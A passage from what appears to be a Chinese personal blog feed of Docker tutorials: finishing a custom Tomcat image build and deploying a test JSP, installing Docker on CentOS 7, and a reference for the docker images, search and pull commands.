/usr/local/jdk-8u301</span><br><span class="line"><span class="meta"> ---&gt;</span><span class="bash"> Running <span class="keyword">in</span> 4a4f4a989d55</span></span><br><span class="line">Removing intermediate container 4a4f4a989d55</span><br><span class="line"><span class="meta"> ---&gt;</span><span class="bash"> 606ed59a4fa1</span></span><br><span class="line">Step 10/15 : ENV CLASSPATH $JAVA_HOME/lib/dt.jar:$JAVA_HOME/lib/tools.jar</span><br><span class="line"><span class="meta"> ---&gt;</span><span class="bash"> Running <span class="keyword">in</span> 489c658ba9b4</span></span><br><span class="line">Removing intermediate container 489c658ba9b4</span><br><span class="line"><span class="meta"> ---&gt;</span><span class="bash"> b43e29dd6f13</span></span><br><span class="line">Step 11/15 : ENV CATALINA_HOME /usr/local/apache-tomcat-10.0.10</span><br><span class="line"><span class="meta"> ---&gt;</span><span class="bash"> Running <span class="keyword">in</span> 55dacf225f4d</span></span><br><span class="line">Removing intermediate container 55dacf225f4d</span><br><span class="line"><span class="meta"> ---&gt;</span><span class="bash"> 8a4dd8f3878b</span></span><br><span class="line">Step 12/15 : ENV CATALINA_BASH /usr/local/apache-tomcat-10.0.10</span><br><span class="line"><span class="meta"> ---&gt;</span><span class="bash"> Running <span class="keyword">in</span> 896ab8940179</span></span><br><span class="line">Removing intermediate container 896ab8940179</span><br><span class="line"><span class="meta"> ---&gt;</span><span class="bash"> 480c915facd1</span></span><br><span class="line">Step 13/15 : ENV PATH $PATH:$JAVA_HOME/bin:$CATALINA_HOME/lib:$CATALINA_HOME/bin</span><br><span class="line"><span class="meta"> ---&gt;</span><span class="bash"> Running <span class="keyword">in</span> 170db3cfd12a</span></span><br><span class="line">Removing intermediate container 170db3cfd12a</span><br><span class="line"><span class="meta"> ---&gt;</span><span class="bash"> ac5dfb75ad04</span></span><br><span class="line">Step 14/15 : EXPOSE 8080</span><br><span class="line"><span class="meta"> ---&gt;</span><span class="bash"> Running <span class="keyword">in</span> dd55e8c200aa</span></span><br><span class="line">Removing intermediate container dd55e8c200aa</span><br><span class="line"><span class="meta"> ---&gt;</span><span class="bash"> 953bd5a52b36</span></span><br><span class="line">Step 15/15 : CMD /usr/local/apache-tomcat-10.0.10/bin/startup.sh &amp;&amp; tail -F /usr/local/apache-tomcat-10.0.10/logs/catalina.out</span><br><span class="line"><span class="meta"> ---&gt;</span><span class="bash"> Running <span class="keyword">in</span> e8f0c4722972</span></span><br><span class="line">Removing intermediate container e8f0c4722972</span><br><span class="line"><span class="meta"> ---&gt;</span><span class="bash"> ec6d3a066471</span></span><br><span class="line">Successfully built ec6d3a066471</span><br><span class="line">Successfully tagged diytomcat:latest</span><br></pre></td></tr></table></figure>

<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630773633046-78ff04ba-e56c-48f4-b044-c7453eb62a16.png" alt="img"></p>
<h2 id="4、启动镜像"><a href="#4、启动镜像" class="headerlink" title="4、启动镜像"></a>4、启动镜像</h2><p>&emsp;&emsp;<code>docker run -d -p 9090:8080 --name xdddiytomcat -v /home/tomcat/test:/usr/local/apache-tomcat-10.0.10/webapps/test -v /home/tomcat/tomcatlogs/:/usr/local/apache-tomcat-10.0.10/logs diytomcat</code></p>
<h2 id="5、测试访问"><a href="#5、测试访问" class="headerlink" title="5、测试访问"></a>5、测试访问</h2><p>&emsp;&emsp;添加入站规则</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630774312822-c0a5f404-c2bc-4bba-b4a3-3afd91d3c962.png" alt="img"></p>
<p>&emsp;&emsp;测试访问，但是发现出错了</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@VM-0-15-centos tomcat]curl localhost:9090</span><br><span class="line">curl: (56) Recv failure: connection reset by peer</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;进入容器查看日志，发现jdk的启动路径写错了。导致当我启动tomcat启动不起来</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630775171968-193641fd-2a9d-4532-89c3-6d143490ebc1.png" alt="img"></p>
<p>&emsp;&emsp;那就将错就错，进入容器把目录名字改成我设置的错的名字就能找到目录了，设置好后重启容器，再次访问即可</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@VM-0-15-centos tomcat]# docker exec -it 717 /bin/bash</span><br><span class="line">[root@717d4ac1437a local]# ls</span><br><span class="line">apache-tomcat-10.0.10  bin  etc  games  include  jdk1.8.0_301  lib  lib64  libexec  readme.txt  sbin  share  src</span><br><span class="line">[root@717d4ac1437a local]# mv jdk1.8.0_301 jdk-8u301</span><br><span class="line">[root@717d4ac1437a local]# exit</span><br><span class="line">[root@VM-0-15-centos tomcat]# docker restart 717</span><br><span class="line">717</span><br><span class="line">[root@VM-0-15-centos tomcat]# curl localhost:9090</span><br></pre></td></tr></table></figure>

<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630775815770-c1f7cbf3-18d5-4296-83d2-6f26cb1022ae.png" alt="img"></p>
<p>&emsp;&emsp;注意：因为我这里Dockerfile就写错了，生成出来的镜像的路径肯定每次也是错的，因此最好重写Dockerfile重新生成镜像，避免每次都要修改路径才能启动tomcat</p>
<h2 id="6、发布项目"><a href="#6、发布项目" class="headerlink" title="6、发布项目"></a>6、发布项目</h2><p>&emsp;&emsp;由于做了卷挂载，我们直接在本地编写项目就可以发布了</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">[root@VM-0-15-centos tomcat]cd /home</span><br><span class="line">[root@VM-0-15-centos home]# ls</span><br><span class="line">ceshi  mysql  tomcat  www</span><br><span class="line">[root@VM-0-15-centos home]# cd tomcat</span><br><span class="line">[root@VM-0-15-centos tomcat]# ls</span><br><span class="line">test  tomcatlogs</span><br><span class="line">[root@VM-0-15-centos tomcat]# cd test</span><br><span class="line">[root@VM-0-15-centos test]# mkdir WEB-INF</span><br><span class="line">[root@VM-0-15-centos test]# cd WEB-INF/</span><br><span class="line">[root@VM-0-15-centos WEB-INF]# vim web.xml</span><br><span class="line"> </span><br><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">web-app</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://java.sun.com/xml/ns/javaee&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://java.sun.com/xml/ns/javaee</span></span></span><br><span class="line"><span class="string"><span class="tag">                             http://java.sun.com/xml/ns/javaee/web-app_2_5.xsd&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">version</span>=<span class="string">&quot;2.5&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">web-app</span>&gt;</span></span><br><span class="line">[root@VM-0-15-centos WEB-INF]# cd ..</span><br><span class="line">[root@VM-0-15-centos test]# ls</span><br><span class="line">WEB-INF</span><br><span class="line">[root@VM-0-15-centos test]# vim index.jsp</span><br><span class="line"></span><br><span class="line">&lt;%@ page language=&quot;java&quot; contentType=&quot;text/html; charset=UTF-8&quot;</span><br><span class="line">    pageEncoding=&quot;UTF-8&quot;%&gt;</span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>Hello，小叮当<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">Hello World!<span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line">&lt;%</span><br><span class="line">out.println(&quot;你的 IP 地址 &quot; + request.getRemoteAddr());</span><br><span class="line">System.out.println(&quot;----my test web logs----&quot;);</span><br><span class="line">%&gt;</span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;访问成功<code>http://IP地址:9090/test</code></p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630778475134-a053cf90-b74e-4801-bff3-16b5441254e4.png" alt="img"></p>
<p>&emsp;&emsp;查看日志文件，也能看到响应记录</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@VM-0-15-centos tomcat]# cd tomcatlogs</span><br><span class="line">[root@VM-0-15-centos tomcatlogs]# ls</span><br><span class="line">catalina.2021-09-04.log  catalina.out  localhost.2021-09-04.log  localhost_access_log.2021-09-04.txt</span><br><span class="line">[root@VM-0-15-centos tomcatlogs]# cat catalina.out</span><br></pre></td></tr></table></figure>

<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630778803163-49f833a3-3c41-45da-8572-1cbaedab4492.png" alt="img"></p>
]]></content>
      <categories>
        <category>docker</category>
      </categories>
      <tags>
        <tag>docker</tag>
      </tags>
  </entry>
  <entry>
    <title>docker安装</title>
    <url>/post/327177db.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="一、Docker的基本组成"><a href="#一、Docker的基本组成" class="headerlink" title="一、Docker的基本组成"></a>一、Docker的基本组成</h1><p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630189658121-fda48094-6318-4c60-b251-4e740542c1fc.png" alt="img"></p>
<p><strong>1、镜像（image）：</strong></p>
<p>&emsp;&emsp;Docker镜像就好比是一个模板，可以通过这个模板来创建容器服务，Tomcat镜像==&gt;run==&gt;Tomecat01容器（提供服务），通过这个镜像可以创建多个容器（最终服务或者项目运行就是在容器中的</p>
<p><strong>2、容器（container）：</strong></p>
<p>&emsp;&emsp;通过镜像来创建的</p>
<p>&emsp;&emsp;Docker利用容器技术，独立运行一个或者一组应用</p>
<p>&emsp;&emsp;目前就可以把这个容器理解为就是一个简易的Linux系统</p>
<p><strong>3、仓库（repository）：</strong></p>
<p>&emsp;&emsp;仓库就是存放镜像的地方</p>
<p>&emsp;&emsp;仓库分为公有仓库和私有仓库</p>
<h1 id="二、安装Docker"><a href="#二、安装Docker" class="headerlink" title="二、安装Docker"></a>二、安装Docker</h1><h2 id="1、环境准备"><a href="#1、环境准备" class="headerlink" title="1、环境准备"></a>1、环境准备</h2><ul>
<li><p>需要Linux基础</p>
</li>
<li><p>CentOS7</p>
</li>
<li><p>使用XShell等连接远程服务器进行操作</p>
</li>
</ul>
<h2 id="2、环境查看"><a href="#2、环境查看" class="headerlink" title="2、环境查看"></a>2、环境查看</h2><p>&emsp;&emsp;<code>uname -r</code>     #可以看到系统内核是3.0以上的（根据目前最新版本的Docker最好用3.0以上的）</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630190998027-5178b78c-86a9-4d77-9e6d-58e9c47ef1bc.png" alt="img"></p>
<p>&emsp;&emsp;<code>cat /etc/os-release</code>    #操作系统版本等信息，可以看到为CentOS7</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630191045289-d8e49bd7-1e5f-445e-8a15-887b4c23a23a.png" alt="img"></p>
<h2 id="3、安装"><a href="#3、安装" class="headerlink" title="3、安装"></a>3、安装</h2><p>&emsp;&emsp;查看帮助文档</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630191257923-ca08032d-432d-453b-b306-0536f273e86d.png" alt="img"></p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630191291748-ec54e317-e612-4404-a188-93e32caba267.png" alt="img"></p>
<h3 id="（1）卸载旧的版本"><a href="#（1）卸载旧的版本" class="headerlink" title="（1）卸载旧的版本"></a>（1）卸载旧的版本</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo yum remove docker \</span><br><span class="line">                  docker-client \</span><br><span class="line">                  docker-client-latest \</span><br><span class="line">                  docker-common \</span><br><span class="line">                  docker-latest \</span><br><span class="line">                  docker-latest-logrotate \</span><br><span class="line">                  docker-logrotate \</span><br><span class="line">                  docker-engine</span><br></pre></td></tr></table></figure>

<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630191459582-c6298c53-8019-49e0-aa05-3ed98add9b91.png" alt="img"></p>
<h3 id="（2）需要的安装包"><a href="#（2）需要的安装包" class="headerlink" title="（2）需要的安装包"></a>（2）需要的安装包</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo yum install -y yum-utils</span><br></pre></td></tr></table></figure>

<h3 id><a href="#" class="headerlink" title></a><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630192978202-9ea6b98b-6354-41dc-83cb-8a668a6fe77f.png" alt="img"></h3><h3 id="（3）设置镜像的仓库"><a href="#（3）设置镜像的仓库" class="headerlink" title="（3）设置镜像的仓库"></a>（3）设置镜像的仓库</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo yum-config-manager \</span><br><span class="line">    --add-repo \</span><br><span class="line">    https://download.docker.com/linux/centos/docker-ce.repo   #默认是国外的</span><br><span class="line"><span class="meta">#</span><span class="bash">建议用国内的，这里用了阿里云的</span></span><br><span class="line">sudo yum-config-manager \</span><br><span class="line">    --add-repo \</span><br><span class="line">    http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo</span><br></pre></td></tr></table></figure>

<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630193327326-54bbb9ee-11b0-4d51-bd3e-0dfd8b5207ba.png" alt="img"></p>
<h3 id="（4）更新yum软件包索引（文档并没有，但是推荐先这样做）"><a href="#（4）更新yum软件包索引（文档并没有，但是推荐先这样做）" class="headerlink" title="（4）更新yum软件包索引（文档并没有，但是推荐先这样做）"></a>（4）更新yum软件包索引（文档并没有，但是推荐先这样做）</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo yum makecache fast</span><br></pre></td></tr></table></figure>

<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630193742930-52d2c07c-00a5-44b7-a3d6-608b84ca0bbd.png" alt="img"></p>
<h3 id="（5）安装Docker相关依赖（docker-ce-社区版-ee-企业版）"><a href="#（5）安装Docker相关依赖（docker-ce-社区版-ee-企业版）" class="headerlink" title="（5）安装Docker相关依赖（docker-ce 社区版  ee 企业版）"></a>（5）安装Docker相关依赖（docker-ce 社区版  ee 企业版）</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo yum install docker-ce docker-ce-cli containerd.io</span><br><span class="line"><span class="meta">#</span><span class="bash">可以使用docker version命令查看是否安装成功</span></span><br></pre></td></tr></table></figure>

<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630193895408-06452251-6f2b-4b08-a74b-58df248e2597.png" alt="img"></p>
<h3 id="（6）启动Docker"><a href="#（6）启动Docker" class="headerlink" title="（6）启动Docker"></a>（6）启动Docker</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">systemctl start docker</span><br></pre></td></tr></table></figure>

<h3 id="（7）运行hello-world"><a href="#（7）运行hello-world" class="headerlink" title="（7）运行hello-world"></a>（7）运行hello-world</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker run hello-world</span><br></pre></td></tr></table></figure>

<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630194278515-365cb481-1185-4483-a8bf-4d29f18e2ffa.png" alt="img"></p>
<h3 id="（8）查看下载的hello-world镜像"><a href="#（8）查看下载的hello-world镜像" class="headerlink" title="（8）查看下载的hello-world镜像"></a>（8）查看下载的hello-world镜像</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker images   </span><br></pre></td></tr></table></figure>

<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630194342773-168e10b3-0461-4293-8147-a4c3b044dc3f.png" alt="img"></p>
<h2 id="4、卸载Docker（了解）"><a href="#4、卸载Docker（了解）" class="headerlink" title="4、卸载Docker（了解）"></a>4、卸载Docker（了解）</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 1、卸载依赖</span></span><br><span class="line">sudo yum remove docker-ce docker-ce-cli containerd.io</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 2、删除资源</span></span><br><span class="line">sudo rm -rf /var/lib/docker   # /var/lib/docker 为Docker的默认工作路径</span><br></pre></td></tr></table></figure>

<h1 id="三、回顾hello-world流程"><a href="#三、回顾hello-world流程" class="headerlink" title="三、回顾hello-world流程"></a>三、回顾hello-world流程</h1><p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630195539318-3872e867-2f1d-4109-8891-81ca87e72d0e.png" alt="img"></p>
<h1 id="四、底层原理"><a href="#四、底层原理" class="headerlink" title="四、底层原理"></a>四、底层原理</h1><h2 id="1、Docker是怎么工作的"><a href="#1、Docker是怎么工作的" class="headerlink" title="1、Docker是怎么工作的"></a>1、Docker是怎么工作的</h2><p>&emsp;&emsp;Docker是一个Client-Server结构的系统，Docker的守护进程运行在主机上，通过Socket从客户端访问。</p>
<p>&emsp;&emsp;DockerServer接收到Docker-Client的指令，就会执行这个命令</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630196704765-f6761549-9aca-4a85-b1b8-6ba89161125a.png" alt="img"></p>
<h2 id="2、Docker为什么比VM快"><a href="#2、Docker为什么比VM快" class="headerlink" title="2、Docker为什么比VM快"></a>2、Docker为什么比VM快</h2><p>&emsp;&emsp;Docker有着比虚拟机更少的抽象层</p>
<p>&emsp;&emsp;Docker利用的是宿主机的内核，VM需要是Guset OS</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630197561993-9b8796b3-5854-4163-a8a5-c5ee38d9caba.jpeg" alt="img"></p>
<p>&emsp;&emsp;所以说，新建一个容器的时候，docker不需要像虚拟机一样重新加载一个操作系统内核，避免引导。虚拟机是加载Guest OS，分钟级别的，而Docker是利用宿主机的操作系统，省略了这个复杂的过程，秒级！</p>
]]></content>
      <categories>
        <category>docker</category>
      </categories>
      <tags>
        <tag>docker</tag>
      </tags>
  </entry>
  <entry>
    <title>docker常用命令</title>
    <url>/post/749ad7d8.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="一、帮助命令"><a href="#一、帮助命令" class="headerlink" title="一、帮助命令"></a>一、帮助命令</h1><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker version       #查看docker版本（有client和server，看到server起来了才说明docker起来了）</span><br><span class="line">docker info          #显示docker的系统信息，包括镜像和容器的数量</span><br><span class="line">docker 命令 --help   #万能命令</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;帮助文档的地址：<a href="https://docs.docker.com/reference/">https://docs.docker.com/reference/</a></p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630198101130-5d7b2e48-d683-4384-8af1-fa8c3fc99492.png" alt="img"></p>
<h1 id="二、镜像命令"><a href="#二、镜像命令" class="headerlink" title="二、镜像命令"></a>二、镜像命令</h1><h2 id="1、查看镜像"><a href="#1、查看镜像" class="headerlink" title="1、查看镜像"></a>1、查看镜像</h2><p>&emsp;&emsp;<code>docker images</code>  列出本地镜像</p>
<p>&emsp;&emsp;<strong>语法：</strong><code>docker images [OPTIONS] [REPOSITORY[:TAG]]</code></p>
<p>&emsp;&emsp;OPTIONS说明：</p>
<table>
<thead>
<tr>
<th><strong>-a，–all</strong></th>
<th><strong>列出本地所有的镜像（含中间映像层，默认情况下，隐藏中间映像层）</strong></th>
</tr>
</thead>
<tbody><tr>
<td><strong>–digests</strong></td>
<td><strong>显示镜像的摘要信息（签名）</strong></td>
</tr>
<tr>
<td><strong>-f，–fliter</strong></td>
<td><strong>根据条件对输出结果进行过滤</strong></td>
</tr>
<tr>
<td><strong>–format</strong></td>
<td><strong>格式化输出结果</strong></td>
</tr>
<tr>
<td><strong>–no-trunc</strong></td>
<td><strong>不截断输出，即显示完整的镜像ID信息</strong></td>
</tr>
<tr>
<td><strong>-q</strong></td>
<td><strong>只显示镜像ID</strong></td>
</tr>
</tbody></table>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#列出最近创建的镜像</span></span><br><span class="line">[root@VM-0-15-centos ~]<span class="comment"># docker images     </span></span><br><span class="line">REPOSITORY      TAG       IMAGE ID       CREATED        SIZE</span><br><span class="line">mysql           latest    5a4e492065c7   11 days ago    514MB</span><br><span class="line">hello-world     latest    d1165f221234   5 months ago   13.3kB</span><br><span class="line">centos          latest    300e315adb2f   8 months ago   209MB</span><br><span class="line">80x86/typecho   latest    3437f7346b4c   2 years ago    53.9MB</span><br><span class="line"></span><br><span class="line"><span class="comment">#列出指定镜像名hello-world:latest的信息</span></span><br><span class="line">[root@VM-0-15-centos ~]<span class="comment"># docker images hello-world:latest</span></span><br><span class="line">REPOSITORY    TAG       IMAGE ID       CREATED        SIZE</span><br><span class="line">hello-world   latest    d1165f221234   5 months ago   13.3kB</span><br><span class="line"></span><br><span class="line"><span class="comment">#列出镜像名为hello-world的所有镜像信息</span></span><br><span class="line">[root@VM-0-15-centos ~]<span class="comment"># docker images hello-world</span></span><br><span class="line">REPOSITORY    TAG       IMAGE ID       CREATED        SIZE</span><br><span class="line">hello-world   latest    d1165f221234   5 months ago   13.3kB</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#也可以使用模糊查找的方式：</span></span><br><span class="line">[root@VM-0-15-centos ~]<span class="comment"># docker images hello-world</span></span><br><span class="line">REPOSITORY    TAG       IMAGE ID       CREATED        SIZE</span><br><span class="line">hello-world   latest    d1165f221234   5 months ago   13.3kB</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#显示镜像完整的ID</span></span><br><span class="line">[root@VM-0-15-centos ~]<span class="comment"># docker images --no-trunc</span></span><br><span class="line">REPOSITORY      TAG       IMAGE ID                                                                  CREATED        SIZE</span><br><span class="line">mysql           latest    sha256:5a4e492065c722ec8cc7413552bafc6fd5434c5ad90797e898ccc4e347e21aa5   11 days ago    514MB</span><br><span class="line">hello-world     latest    sha256:d1165f2212346b2bab48cb01c1e39ee8ad1be46b87873d9ca7a4e434980a7726   5 months ago   13.3kB</span><br><span class="line">centos          latest    sha256:300e315adb2f96afe5f0b2780b87f28ae95231fe3bdd1e16b9ba606307728f55   8 months ago   209MB</span><br><span class="line">80x86/typecho   latest    sha256:3437f7346b4c58c7451ff6e398f9b8e4019a7a34186af61aba54d0f00a71a398   2 years ago    53.9MB</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#显示镜像的摘要（签名）</span></span><br><span class="line">[root@VM-0-15-centos ~]<span class="comment"># docker images --digests</span></span><br><span class="line">REPOSITORY      TAG       DIGEST                                                                   IMAGE ID       CREATED        SIZE</span><br><span class="line">mysql           latest    sha256:d45561a65aba6edac77be36e0a53f0c1fba67b951cb728348522b671ad63f926   5a4e492065c7   11 days ago    514MB</span><br><span class="line">hello-world     latest    sha256:7d91b69e04a9029b99f3585aaaccae2baa80bcf318f4a5d2165a9898cd2dc0a1   d1165f221234   5 months ago   13.3kB</span><br><span class="line">centos          latest    sha256:5528e8b1b1719d34604c87e11dcd1c0a20bedf46e83b5632cdeac91b8c04efc1   300e315adb2f   8 months ago   209MB</span><br><span class="line">80x86/typecho   latest    sha256:4af25c76919efa862d59aeb3a2d9f2394ad3ef4b338037e8a2499c55011dbbf7   3437f7346b4c   2 years ago    53.9MB</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#筛选在hello-world:latest镜像之前创建的镜像</span></span><br><span class="line">[root@VM-0-15-centos ~]<span class="comment"># docker images -f &quot;before=hello-world:latest&quot;</span></span><br><span class="line">REPOSITORY      TAG       IMAGE ID       CREATED        SIZE</span><br><span class="line">centos          latest    300e315adb2f   8 months ago   209MB</span><br><span class="line">80x86/typecho   latest    3437f7346b4c   2 years ago    53.9MB</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#筛选在hello-world:latest镜像之后创建的镜像</span></span><br><span class="line">[root@VM-0-15-centos ~]<span class="comment"># docker images -f &quot;since=hello-world:latest&quot;</span></span><br><span class="line">REPOSITORY   TAG       IMAGE ID       CREATED       SIZE</span><br><span class="line">mysql        latest    5a4e492065c7   11 days ago   514MB</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#列出虚悬镜像</span></span><br><span class="line">[root@VM-0-15-centos ~]<span class="comment"># docker images -f &quot;dangling=true&quot;</span></span><br><span class="line">REPOSITORY   TAG       IMAGE ID   CREATED   SIZE</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#显示镜像ID和镜像名</span></span><br><span class="line">[root@VM-0-15-centos ~]<span class="comment"># docker images --format &quot;&#123;&#123;.ID&#125;&#125;: &#123;&#123;.Repository&#125;&#125;&quot;</span></span><br><span class="line">5a4e492065c7: mysql</span><br><span class="line">d1165f221234: hello-world</span><br><span class="line">300e315adb2f: centos</span><br><span class="line">3437f7346b4c: 80x86/typecho</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#以表格的形式显示镜像ID、镜像名和镜像标签</span></span><br><span class="line">[root@VM-0-15-centos ~]<span class="comment"># docker images --format &quot;table &#123;&#123;.ID&#125;&#125;\t&#123;&#123;.Repository&#125;&#125;\t&#123;&#123;.Tag&#125;&#125;&quot;</span></span><br><span class="line">IMAGE ID       REPOSITORY      TAG</span><br><span class="line">5a4e492065c7   mysql           latest</span><br><span class="line">d1165f221234   hello-world     latest</span><br><span class="line">300e315adb2f   centos          latest</span><br><span class="line">3437f7346b4c   80x86/typecho   latest</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#解释</span></span><br><span class="line">REPOSITORY   镜像的仓库源</span><br><span class="line">TAG          镜像的标签</span><br><span class="line">IMAGE ID     镜像的id</span><br><span class="line">CREATED      镜像的创建时间</span><br><span class="line">SIZE         镜像的大小</span><br></pre></td></tr></table></figure>

<h2 id="2、搜索镜像"><a href="#2、搜索镜像" class="headerlink" title="2、搜索镜像"></a>2、搜索镜像</h2><p>&emsp;&emsp;<code>docker search</code> 搜索镜像</p>
<p>&emsp;&emsp;<strong>语法：</strong><code>docker search [OPTIONS] TERM</code></p>
<p>&emsp;&emsp;OPTIONS说明：</p>
<table>
<thead>
<tr>
<th><strong>–automated</strong></th>
<th><strong>只列出 automated build类型的镜像</strong></th>
</tr>
</thead>
<tbody><tr>
<td><strong>-f，–filter</strong></td>
<td><strong>列出收藏数不小于指定值的镜像</strong></td>
</tr>
<tr>
<td><strong>–no-trunc</strong></td>
<td><strong>不截断输出，即显示完整的镜像ID信息</strong></td>
</tr>
</tbody></table>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@VM-0-15-centos ~]# docker search mysql</span><br><span class="line">NAME                              DESCRIPTION                                     STARS     OFFICIAL   AUTOMATED</span><br><span class="line">mysql                             MySQL is a widely used, open-source relation…   11332     [OK]</span><br><span class="line">mariadb                           MariaDB Server is a high performing open sou…   4307      [OK]</span><br><span class="line">mysql/mysql-server                Optimized MySQL Server Docker images. Create…   840                  [OK]</span><br><span class="line">phpmyadmin                        phpMyAdmin - A web interface for MySQL and M…   305       [OK]</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">从 Docker Hub 查找所有镜像名包含mysql，并且收藏数大于等于 3000 的镜像</span></span><br><span class="line">[root@VM-0-15-centos ~]# docker search mysql -f stars=3000</span><br><span class="line">NAME      DESCRIPTION                                     STARS     OFFICIAL   AUTOMATED</span><br><span class="line">mysql     MySQL is a widely used, open-source relation…   11334     [OK]</span><br><span class="line">mariadb   MariaDB Server is a high performing open sou…   4307      [OK]</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">参数说明</span></span><br><span class="line">NAME           #镜像仓库源的名称</span><br><span class="line">DESCRIPTION    #镜像的描述</span><br><span class="line">OFFICIAL       #是否 docker 官方发布</span><br><span class="line">STARS          #类似 Github 里面的 star，表示点赞、喜欢的意思。</span><br><span class="line">AUTOMATED      #自动构建</span><br></pre></td></tr></table></figure>

<h2 id="3、下载镜像"><a href="#3、下载镜像" class="headerlink" title="3、下载镜像"></a>3、下载镜像</h2><p>&emsp;&emsp;<code>docker pull</code>  下载镜像</p>
<p>&emsp;&emsp;<strong>语法：</strong><code>docker pull [OPTIONS] NAME[:TAG|@DIGEST]</code></p>
<p>&emsp;&emsp;OPTIONS说明：</p>
<table>
<thead>
<tr>
<th align="left"><strong>-a</strong></th>
<th align="left"><strong>拉取所有 tagged 镜像</strong></th>
</tr>
</thead>
<tbody><tr>
